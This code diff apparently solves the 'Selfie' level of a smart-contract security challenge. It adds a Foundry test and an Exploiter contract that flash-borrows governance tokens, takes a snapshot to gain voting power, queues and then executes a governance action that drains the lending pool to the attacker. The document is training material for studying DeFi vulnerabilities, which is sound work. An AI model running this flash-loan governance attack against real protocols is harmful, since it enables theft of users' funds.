@@ -44,13 +44,12 @@ contract Selfie is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
-
-        /**
-         * EXPLOIT END *
-         */
+        vm.startPrank(attacker);
+        Exploiter exploiter = new Exploiter(simpleGovernance, selfiePool, dvtSnapshot);
+        exploiter.exploit(TOKENS_IN_POOL);
+        vm.warp(block.timestamp + simpleGovernance.getActionDelay());
+        exploiter.drainAllFunds();
+        vm.stopPrank();
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
@@ -59,5 +58,42 @@ contract Selfie is Test {
         // Attacker has taken all tokens from the pool
         assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
         assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
+    }
+}
+
+contract Exploiter {
+    uint256 actionId;
+
+    SimpleGovernance private immutable simpleGovernance;
+    SelfiePool private immutable selfiePool;
+    DamnValuableTokenSnapshot private immutable dvtSnapshot;
+    address private immutable owner;
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Only owner"); // Avoid searcher front-running
+        _;
+    }
+
+    constructor(SimpleGovernance _simpleGovernance, SelfiePool _selfiePool, DamnValuableTokenSnapshot _dvtSnapshot) {
+        simpleGovernance = _simpleGovernance;
+        selfiePool = _selfiePool;
+        dvtSnapshot = _dvtSnapshot;
+        owner = msg.sender;
+    }
+
+    function exploit(uint256 _borrow) external onlyOwner {
+        selfiePool.flashLoan(_borrow);
+    }
+
+    function receiveTokens(address _token, uint256 _borrowed) external {
+        dvtSnapshot.snapshot();
+        actionId = simpleGovernance.queueAction(
+            address(selfiePool), abi.encodeWithSignature("drainAllFunds(address)", owner), 0
+        );
+        dvtSnapshot.transfer(address(selfiePool), _borrowed);
+    }
+
+    function drainAllFunds() external onlyOwner {
+        simpleGovernance.executeAction(actionId);
     }
 }
